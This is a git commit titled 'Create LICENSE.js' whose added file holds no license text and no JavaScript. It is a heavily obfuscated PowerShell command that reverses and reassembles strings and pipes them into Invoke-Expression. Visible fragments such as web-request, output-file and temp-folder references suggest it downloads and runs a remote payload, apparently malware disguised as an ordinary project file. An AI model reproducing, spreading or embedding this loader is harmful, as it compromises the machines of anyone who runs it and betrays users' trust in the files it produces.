b87b7d13127c5aa39b57d98fa832428b3ac150d4
Azkic50 <Azkilohj55@gmail.com>
2025-03-28 19:41:12 -0400

    Create LICENSE.js

---
+++ LICENSE.js
@@ -0,0 +1,22 @@
+. ( $ENV:coMsPEc[4,24,25]-jOin'') ( ( -Join[REGex]::MaTchEs(" ) )421]RaHc[]gNIRTs[,)67]RaHc[+901]RaHc[+84]RaHc[((eCaLper.)43]RaHc[]gNIRTs[,)401]RaHc[+221]RaHc[+56]RaHc[((eCaLper.)93]RaHc[]gNIRTs[,)09]RaHc[+401]RaHc[+88]RaHc[((eCaLper.)'NOisseRpxE-EkOVnI Lm0)421]rAHc[,)5'+'01]rAHc[+87]rAHc[+201]rAHc[( EcALPeRc-  93]rAHc[,)'+'25]rAHc[+0'+'11]r'+'AHc[+021]rAHc[(ECALPeR-29]rAHc[,ZhX8hJZhXEC'+'ALPeR- ))ZhXx+4nxLg/q4nx+4nx14nx+4nxL4nx+4nx,q1L'+'4nx+4nxtth'+'q4nZhX,ZhX4nx+4nxLvnIq14nx+4nxL f- Fa4nZhX,ZhXag}34nx+'+'4nx{}24nx+4nx{}9{4n'+'x+4nx}4nx+4nx1{4nx+4nx}8{}4n'+'x+ZhX,Zh'+'X+4nxsOod4nx+4nx'+'{ZhX,ZhX04nx+4nxXi4nx+4nx'+'      
+;4nx+'+'4nxF4nx+4nxag)b.4nx+4nxi0Xi(0X4nx'+'+4nxi4nx+4nxt4nx+4nxR8PZhX,ZhX4nx+ZhX,ZhX+4nxLhcat4nx+'+'4nxq4'+'nx+'+'4nx1L,q4nx+4nx1L4nx+4nxhtiq4nx+4nx1L,'+'q1L4nx+4nxmoc4nx+4nx.bq1L4nx+4nx,q1ZhX,ZhX+4nx
+4nx+4nx{ h4nx+4nxct4nx+4nxac 4nx+4nx'+' 4nx+'+'4nx  
+'+'} '+'4nx+4nx   4'+'nx+4nZhX'+',ZhXHC[+511]RAHC[+97]RAHC[((ECalpEZhX,ZhXxq4nx+ZhX,ZhXx+4nxcs4nx+4nxO4nx+4nxZhX,ZhX'+'xZhX,ZhXx+4nxL,'+'q1LeMq1L,q1ZhX,ZhX4'+'nx1'+'L,q1Lsm4nx+4nx.FFIq4nx+4nx1L4nx+4nx,q4nx+4nx1LGq1L,4nx+4nxq4nx+4nx14n'+'x+'+'4'+'nxLiq1Lf4nx+4nx- Fag}04nx+4nx{4nx+4nx}2{}1'+'4nx+4nx{}3{4nx+4nx'+'Fag(4nx+4nxZhX,ZhXx}dAc4nx+4nxsO4nx+4nxOLNwocs4nx+4nxO4nx+4nxd4nx+4nx{ZhX,ZhXnx-e4nx+4nxkoq14nx+4nxZhX,ZhX4nx+4nxLesu/q1L4nx+4nx,q'+'4nx+4nZhX,ZhX4nx+4nx0Xi( f4nx+4nxi   ZhX,ZhXx,q1LP-tq14nx+4nxL,'+'q1Lsse4nx+4nxc'+'or4n'+'x+4nxq1L f-FaZhX,ZhXL,4nx+4nxq1Ld4'+'nx+4nxo4nx+4nxhtq4nx+4n'+'x14nZhX,'+'Z'+'hXx+4n'+'xg}4nx+4nx24nx+4'+'nx{4nx+4nx}4nx+4nx1{}34nx+4nx{4nx+4nx}4n'+'x+4nx0{F4nx+4nxag(4nx+4nx& 4nx+4nx  4nx+4nx'+'     
+{4nx+4nx )'+'4nx+4nZ'+'hX,ZhXXi4nx+4n'+'x     4nx+4nx 
+4nx+4nx{ yZhX,ZhXrt    
+'+'{4nx+4nx )}4n'+'x+4nxaTcs4nx+4nxOA4nx+4nxcs4'+'n'+'x+4nxODE4nx+4nxm4nx+4nxO4nx+4nxs{'+'0Xi n4nx+4nxi }I4nx+4nx{0Xi( hcZhX,ZhX+4nx,q1L7q4nx+4nx1L,q4nx+4nx1L'+'t4nx'+'+4nxnem'+'q1L4nx'+'+'+'4nx,q4nx+4nx1Luq1L,'+'4nx+4nxq4nx+4nZhX,ZhXx)4nx+4nxq4nx+4nx1Lts'+'e4nxZhX,ZhX[]gNirTs[ZhX,ZhXRAHC[]gNirTs[,4nxq1L4nx(ECalpER.)43]RAHC[]gNirTsZhX,ZhXelIf{0'+'Xi )q4nx+4nx1Lra4nx+4nxtq1'+'4nx+4nxZhX,ZhX 4nx+4nx= )q14nx+4nxLbq14nx+4nx'+'L4nx+4nx( ;)q14ZhX,ZhX4nxL'+'c4nx+4nxs4nx+'+'4nxO4nx+'+'4nxNwc4nxZhX,ZhXR.)4nx'+'8hJ4nx,)611]RAHC['+'+28'+']RAHC[+65]R'+'AHC[((ECalpER.)93]ZhX,ZhX4nZhX,ZhXx14nx+4nxL-r4nx+4nxq1L,q1ZhX,ZhXnx    
+}   4nx+4nx   4nx+4nx
+ ;}H4nx+4nxT4nx+4nxcsOAPeL4nx+4nxIF{04nx+4'+'nxX4nx+4nxi4nx+4nx e4nx+4nxliFtuO'+'- F4nx+4nxagAF4nx+4nxag.}i{0Xi4nx+4nx 4nx+4n'+'xirU- 4nx+4nZhX,ZhX+4nx14nx+4nxL'+'4nx+4nxf- 4nx+4nxF4nx+4nxZhX,ZhXMET:4nx+4nx'+'v4nx+4n'+'xne0XiF4nx+4nxa4nx+4nxg = }4nx+4nxh4nx+4nxt'+'4nx+4nxA4nx+4nxp4nx+4nxe'+'lc4nx+ZhX,ZhX4nx41{}44nx+4nx{}4nx+'+'4nx6{}54nx+4nx{}21{}7{}314nx+4nx{}11'+'{4n'+'x+4nx}0{}51{}04nx+4nx14nx+4nx{Fag( 4nx+4nx= )q1Laq4nx+4nx14nx+4nxL({@'+']t4nx+4nxc4nx+4nxej4nx+4nxbO4nx+4nxm4nx+4nxotsu4nx+4nxC4nx+4nxS4nx+4nxP4nx+4nx[ 4nx+4nx 4nx+4nx
+(4nx+4'+'nx@ 4nx+4nx='+' }4nx+ZhX,Zh'+'Xg}0{}1{}3{}2{Fag(&  4nx+4ZhX,ZhXx+4nx14nx+4nxL4nxZhX,ZhXnx+4nxcsOol4nx+4nxn4nx+4nxwOcsOD{04nx+4nxX4nx+4nxi   '+'4nx+4nx     
+{ )4nx+4nx}H4nx+4nxtA4nx+4nxcsOpELc4'+'nx+4nxsOiF{0Xi )'+'q4nx+4nx1Lh4nx+4nxt4nx+4nxaq1L,q1'+'L4nx+4nxseTq1L,q1LP-tq4nx+4nx1L4nx+4nx '+'f-4nx+4nxF4nx+4nxag}2{}0{}1{Fag(&( 4nx+4nxf4nx+'+'4nxi   4nx+4nx  4nx+4nx 4nx+4nx
+;}E4nx+4nxu4nx+4nxR'+'cs4nx+4nxOt{0Xi 4nx+4nx= }D4nx+4nxAo'+'ZhX,ZhX)99]RAZhX,ZhX4nx(ECalpE'+'R.)69]'+'RAHCZhX,ZhX4'+'nxsOif{0ZhX,ZhXx 4nx+4nx 4nx+4nx 4nx+4nx'+'   
+4nZhX,ZhXnx+4nZhX,ZhXL4nx+4nx,q4nx+4n'+'x'+'1LS4nx+4nxq4nx+4nx1L4ZhX,ZhXx0Xi = }4nx+4nxDA4ZhX,ZhXx1Ltaq1L,q1Lp4nx'+'+4nxiq1L,4nx+4nxq14nx+4nxLz4nx+4nx.UFIGQ4nx+4nxBB4nx+4nxS/4nx+4nx14nx+4nxq1L,4nx+4nZhX,ZhXx
+;}4nx+4nxH4nx+4nxTA4nx+4nxcs4nx+4nxOp4nZhX,ZhXgNirTs[,4nx0XiZhX,ZhXnoIss'+'eRpXe-eKOvni iNf)63]RAHC[]ZhX,ZhX[,)07]RAHC[+79]RAHC[+301]RAHC[((ECalpER.)4nx  
+'+'
+}  
+} 4nx+4nx '+' 4n'+'x'+'+4nx 4nxZ'+'hX,ZhXx+4nx;}e4nx+4nxSlcsO4nx+4nxa4nx+4nxf{4nx+4nZhX,ZhX4nx1L94nx+4nx31591/4nx+4nxselif/4nx+4nxsq1L,q1L/:sq4nxZhX,ZhX4nZhX,ZhXnx+4nxZhX,ZhX+4nxR4nx+4ZhX,ZhX'+'Lp'+'q4nx+4nx1L,q14nxZhX,ZhX,ZhX,ZhXaer4nx+4'+'nxof  
+;)
+})q1L4nx+4nxQ4nx+4nxBBSq4nx+ZhX,'+'ZhX4nxatAc4nx+4nxs4nx+4nxO4nx+4nxdE4nx+4nxMo4nx+4nxcsOs{0Xi  
+4nx+4nx
+4nx( ZhX,ZhX+4nx   
+ 4nx+4nx}4nx+4nZhXf-hzA}11{}21{}02{}63{}3{}12{}35{}13{}53{}01{}45{}31'+'{}15{}43{}61{}71{}34{}42{}82{}73{}5{}64{}24{}94{}06'+'{}14{}74{}44{}7{}05{}0{}81{}'+'9{}51{}22'+'{}65{}23{}85{}75{}62{}91{}04{}93{}2{}84{}33{}6{}4{}55{}03{}16{}32{}83{}92{}54{'+'}41{}25{}8{}72{}95{}52{}1{hzA((( '(( )'X'+]03[eMoHsp$+]12[emOhSP$ ( .  " ,'.', 'riGhTto'+'l'+'E'+'Ft'))) 
